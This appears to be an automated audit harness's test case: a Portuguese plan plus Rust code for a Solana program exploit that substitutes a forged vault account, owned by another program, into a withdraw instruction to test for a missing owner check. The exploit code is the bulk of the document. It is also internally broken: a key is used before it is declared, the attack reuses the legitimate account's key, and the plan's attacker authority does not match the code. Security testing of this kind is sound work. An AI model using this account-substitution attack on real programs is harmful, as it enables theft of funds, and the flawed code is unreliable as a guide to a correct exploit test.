  "plan": "Preparamos uma conta vault legitima com dados contendo a authority real e saldo, e uma conta authority signer. O baseline executa withdraw com a vault real e a authority correta, provando que o cenario esta montado. O ataque substitui a vault por uma conta forjada cujo dono e outro programa (ou system) e cujos dados colocam a authority do atacante em [8..40] e saldo alto em [40..48], mantendo a mesma authority signer. O efeito mede que a conta forjada foi aceita e usada: os lamports da conta forjada foram debitados e os do recipient creditados, apesar do dono diferente do programa.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();

// Conta vault legitima: dados = [8 bytes discriminador/prefixo] + authority (32) + saldo (8)
let mut vault_data = vec![0u8; 48];
vault_data[8..40].copy_from_slice(authority.as_ref());
vault_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());
let vault_legit = account(&env.program_id, &vault_data, Some(2_000_000));

let authority_acc = wallet(1_000_000);
let recipient_acc = wallet(1_000_000);

let ix_data = [1u8, 500_000u64.to_le_bytes()[0], 500_000u64.to_le_bytes()[1], 500_000u64.to_le_bytes()[2], 500_000u64.to_le_bytes()[3], 500_000u64.to_le_bytes()[4], 500_000u64.to_le_bytes()[5], 500_000u64.to_le_bytes()[6], 500_000u64.to_le_bytes()[7]];
let metas = vec![
    AccountMeta::new(vault_legit_key, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
];

// Baseline: vault real, authority correta
let vault_legit_key = Pubkey::new_unique();
let ix_baseline = env.raw_ix(&ix_data, metas.clone());
let contas_baseline = vec![
    (vault_legit_key, vault_legit),
    (authority, authority_acc),
    (recipient, recipient_acc),
];
let r_base = env.baseline("withdraw legitimo", &ix_baseline, &contas_baseline);

// Ataque: vault forjada, dono diferente do programa, dados com authority do atacante e saldo alto
let vault_forged_key = Pubkey::new_unique();
let mut forged_data = vec![0u8; 48];
forged_data[8..40].copy_from_slice(authority.as_ref());
forged_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());
let vault_forged = account(&Pubkey::new_unique(), &forged_data, Some(2_000_000));

let ix_attack = env.raw_ix(&ix_data, metas);
let contas_attack = vec![
    (vault_forged_key, vault_forged),
    (authority, wallet(1_000_000)),
    (recipient, wallet(1_000_000)),
];
let r = env.attack("withdraw com vault forjada", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let vault_after = after(&r, &vault_forged_key);
    let recipient_after = after(&r, &recipient);
    env.effect("vault forjada debitada", vault_after.lamports() == 1_500_000);
    env.effect("recipient creditado", recipient_after.lamports() == 1_500_000);
    env.effect("saldo forjado atualizado", read_u64(vault_after.data(), 40) == 500_000);
}"
}

